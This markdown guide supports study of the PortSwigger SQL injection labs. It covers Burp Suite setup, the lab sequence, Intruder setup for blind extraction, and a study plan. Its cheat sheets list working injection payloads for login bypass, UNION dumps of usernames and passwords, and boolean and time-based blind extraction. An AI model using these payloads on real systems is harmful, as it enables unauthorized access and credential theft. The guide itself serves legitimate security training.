# SQL Injection Quick Start Guide

This is a quick reference companion to the comprehensive [sql-injection.md](./sql-injection.md) documentation.

## Getting Started with PortSwigger Labs

### Setup
1. Visit https://portswigger.net/web-security/all-labs
2. Create free account (no credit card required)
3. Install Burp Suite Community Edition: https://portswigger.net/burp/communitydownload
4. Configure browser proxy to 127.0.0.1:8080

### Lab Progression Path

**Beginners Start Here:**
1. Lab 1: WHERE clause - Hidden data (Basic SQL injection)
2. Lab 2: Login bypass (Authentication bypass)

**Intermediate - UNION Attacks:**
3. Lab 3: Column count determination
4. Lab 4: Finding text columns
5. Lab 5: Extracting data from other tables
6. Lab 6: Multiple values in single column

**Intermediate - Database Enumeration:**
7. Lab 7: MySQL/MSSQL version query
8. Lab 8: Oracle version query
9. Lab 9: Non-Oracle database contents
10. Lab 10: Oracle database contents

**Advanced - Blind SQL Injection:**
11. Lab 11: Boolean-based blind (conditional responses)
12. Lab 12: Error-based blind (conditional errors)
13. Lab 13: Visible error-based
14. Lab 14: Time delays
15. Lab 15: Time-based information extraction

**Expert - Out-of-Band:**
16. Lab 16: Out-of-band interaction (requires Burp Pro)
17. Lab 17: Out-of-band data exfiltration (requires Burp Pro)

**Advanced - WAF Bypass:**
18. Lab 18: XML encoding bypass

## Essential Burp Suite Shortcuts

| Action | Windows/Linux | Mac |
|--------|---------------|-----|
| Send request | Ctrl+Space | Cmd+Space |
| Switch tabs | Ctrl+Tab | Cmd+Tab |
| URL encode | Ctrl+U | Cmd+U |
| URL decode | Ctrl+Shift+U | Cmd+Shift+U |
| Send to Repeater | Ctrl+R | Cmd+R |
| Send to Intruder | Ctrl+I | Cmd+I |

## Quick Payload Reference

### Authentication Bypass
```sql
admin'--
admin' OR '1'='1'--
' OR 1=1--
```

### UNION Column Detection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Data Extraction (2 columns)
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

### Blind Boolean
```sql
' AND 1=1--    (True - "Welcome back" appears)
' AND 1=2--    (False - no "Welcome back")
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

### Time-Based (PostgreSQL)
```sql
'; SELECT pg_sleep(10)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## Database-Specific Syntax Cheat Sheet

### Comments
| Database | Syntax |
|----------|--------|
| MySQL | `#` or `-- ` (space required) |
| PostgreSQL | `--` |
| MSSQL | `--` |
| Oracle | `--` |

### String Concatenation
| Database | Syntax | Example |
|----------|--------|---------|
| MySQL | `CONCAT()` or space | `CONCAT('a','b')` or `'a' 'b'` |
| PostgreSQL | `\|\|` | `'a'\|\|'b'` |
| MSSQL | `+` | `'a'+'b'` |
| Oracle | `\|\|` | `'a'\|\|'b'` |

### Time Delays
| Database | Function | Example |
|----------|----------|---------|
| MySQL | `SLEEP()` | `SELECT SLEEP(10)` |
| PostgreSQL | `pg_sleep()` | `SELECT pg_sleep(10)` |
| MSSQL | `WAITFOR DELAY` | `WAITFOR DELAY '0:0:10'` |
| Oracle | `dbms_pipe.receive_message()` | `dbms_pipe.receive_message('a',10)` |

### Version Detection
| Database | Query |
|----------|-------|
| MySQL | `SELECT @@version` or `SELECT version()` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |

## Common Mistakes to Avoid

### Lab 1-2 (Basics)
❌ Forgetting SQL comment syntax (`--`)
❌ Not URL-encoding properly
✅ Use `'+OR+1=1--` format

### Lab 3-6 (UNION Attacks)
❌ Not matching column count exactly
❌ Testing all columns at once instead of one by one
✅ Use NULL for unknown data types
✅ Test string columns individually

### Lab 11-15 (Blind SQLi)
❌ Not configuring Burp Intruder's Grep Match
❌ Using multi-threaded resource pools for time-based attacks
✅ Set resource pool max concurrent requests = 1 for time-based
✅ Monitor "Response received" column, not "Response completed"

### Lab 16-17 (Out-of-Band)
❌ Forgetting to replace BURP-COLLABORATOR-SUBDOMAIN
❌ Not checking Collaborator tab for interactions
✅ Use Burp Pro (required for Collaborator)
✅ Check both DNS and HTTP interactions

## Burp Intruder Configuration for Blind SQLi

### Boolean-Based (Lab 11)
1. Send request to Intruder
2. Add payload position: `§a§` around test character
3. Payload type: Simple list
4. Add payloads: a-z and 0-9
5. Options → Grep - Match → Add "Welcome back"
6. Start attack
7. Look for checked responses

### Time-Based (Lab 15)
1. Resource Pool → Create new pool
2. Set "Maximum concurrent requests" = 1 ⚠️ CRITICAL
3. Add payload position: `§a§`
4. Payload type: Simple list
5. Add payloads: a-z and 0-9
6. Start attack
7. Sort by "Response received" column
8. Look for ~10,000ms delays (vs ~100-500ms normal)

## Database Enumeration Roadmap

```
1. Identify Database Type
   ├─ Test version query syntax
   ├─ Observe error messages
   └─ Test time delay functions

2. Enumerate Tables
   ├─ MySQL/PostgreSQL: information_schema.tables
   └─ Oracle: all_tables

3. Enumerate Columns
   ├─ MySQL/PostgreSQL: information_schema.columns
   └─ Oracle: all_tab_columns

4. Extract Data
   └─ SELECT column_name FROM table_name
```

## When to Use Each Technique

### Use UNION-based when:
✅ Query results visible in application response
✅ You can match column count and data types
✅ No WAF blocking UNION keyword

### Use Boolean blind when:
✅ Application shows different responses for true/false
✅ "Welcome back" or similar conditional message
✅ Can't see query results directly

### Use Time-based blind when:
✅ No visible response differences
✅ Application doesn't show different content
✅ Last resort when other techniques fail

### Use Error-based when:
✅ Database errors displayed to user
✅ Error messages contain query data
✅ Type casting errors reveal information

### Use Out-of-band when:
✅ Have Burp Suite Professional
✅ Asynchronous query execution
✅ All other techniques blocked or unreliable

## Essential Tools Installation

### Burp Suite Community Edition
```bash
# Download from: https://portswigger.net/burp/communitydownload
# Windows/Mac: Run installer
# Linux:
chmod +x burpsuite_community_linux.sh
./burpsuite_community_linux.sh
```

### sqlmap
```bash
# Kali Linux (pre-installed):
sqlmap -h

# Other Linux:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py -h

# Using pip:
pip3 install sqlmap
```

### Hackvertor (Burp Extension for Lab 18)
1. Burp Suite → Extender → BApp Store
2. Search "Hackvertor"
3. Click "Install"
4. Usage: Highlight payload → Right-click → Extensions → Hackvertor → Encode → hex_entities

## Study Plan

### Week 1: Foundations
- Day 1-2: Labs 1-2 (Basic injection + auth bypass)
- Day 3-4: Labs 3-4 (UNION column enumeration)
- Day 5-6: Labs 5-6 (UNION data extraction)
- Day 7: Review and practice

### Week 2: Database Enumeration
- Day 1-2: Labs 7-8 (Version queries)
- Day 3-4: Labs 9-10 (Database contents)
- Day 5-7: Practice and review all UNION techniques

### Week 3: Blind SQL Injection
- Day 1-2: Lab 11 (Boolean blind)
- Day 3-4: Lab 12-13 (Error-based)
- Day 5-6: Lab 14-15 (Time-based)
- Day 7: Review blind techniques

### Week 4: Advanced Topics
- Day 1-2: Labs 16-17 (Out-of-band) - requires Burp Pro
- Day 3-4: Lab 18 (WAF bypass)
- Day 5-7: Review all labs, automation with sqlmap

## Troubleshooting

### Issue: Burp Proxy not intercepting
**Solution:**
1. Check Burp Proxy → Intercept is on
2. Verify proxy settings: 127.0.0.1:8080
3. Import Burp CA certificate in browser

### Issue: Lab not solving after correct payload
**Solution:**
1. Check for trailing spaces in payload
2. Verify exact payload format from solution
3. Ensure proper URL encoding
4. Check if using correct database syntax

### Issue: Burp Intruder not detecting password
**Solution:**
1. Verify Grep Match configured correctly
2. For time-based: Check resource pool = 1
3. Monitor correct column ("Response received" for time-based)
4. Ensure payload list includes correct characters

### Issue: Out-of-band labs not working
**Solution:**
1. Confirm using Burp Suite Professional
2. Check Burp Collaborator is polling
3. Verify replaced BURP-COLLABORATOR-SUBDOMAIN
4. Wait 30-60 seconds for interactions

## Next Steps After Completing Labs

1. **Practice on Other Platforms:**
   - HackTheBox (https://hackthebox.com)
   - TryHackMe (https://tryhackme.com)
   - PentesterLab (https://pentesterlab.com)

2. **Learn Automation:**
   - Master sqlmap usage
   - Write custom Python scripts
   - Create Burp extensions

3. **Study Real CVEs:**
   - Research disclosed SQL injection vulnerabilities
   - Read bug bounty reports
   - Analyze patch diffs

4. **Certifications:**
   - eWPT (Web Application Penetration Tester)
   - OSWE (Offensive Security Web Expert)
   - CEH (Certified Ethical Hacker)
   - OSCP (includes web app testing)

5. **Responsible Disclosure:**
   - Join bug bounty platforms (HackerOne, Bugcrowd)
   - Practice responsible disclosure
   - Build professional portfolio

## Resources

### Official Documentation
- **Full SQL Injection Guide**: [sql-injection.md](./sql-injection.md)
- **PortSwigger Tutorial**: https://portswigger.net/web-security/sql-injection
- **SQL Injection Cheat Sheet**: https://portswigger.net/web-security/sql-injection/cheat-sheet

### Video Walkthroughs
- **Rana Khalil**: YouTube channel with all lab solutions
- **The Cyber Mentor**: SQL injection fundamentals
- **PortSwigger**: Official lab walkthroughs

### Books
- "The Web Application Hacker's Handbook" by Stuttard & Pinto
- "SQL Injection Attacks and Defense" by Justin Clarke

### Practice More
- **DVWA**: Damn Vulnerable Web Application
- **SQLi Labs**: 75+ SQL injection challenges
- **WebGoat**: OWASP educational platform

## Quick Reference Card

**Most Common Payload (Copy-Paste Ready):**
```
' UNION SELECT NULL,username||':'||password FROM users--
```

**Most Common Burp Intruder Setup:**
1. Payload: `§a§`
2. Simple list: a-z, 0-9
3. Grep Match: Success indicator
4. Resource Pool: 1 (for time-based only)

**Database Detection Fast:**
```sql
# Oracle (requires FROM)
' UNION SELECT NULL FROM dual--

# MySQL (# comment)
' UNION SELECT NULL#

# PostgreSQL/MSSQL
' UNION SELECT NULL--
```

**Emergency Escape Sequence:**
If you break a lab, click "Access the lab" again to reset.

---

**Ready to Start?**
1. Open [sql-injection.md](./sql-injection.md) for detailed solutions
2. Access PortSwigger labs: https://portswigger.net/web-security/all-labs
3. Begin with Lab 1: SQL injection vulnerability in WHERE clause

**Good luck and happy (ethical) hacking! 🛡️**
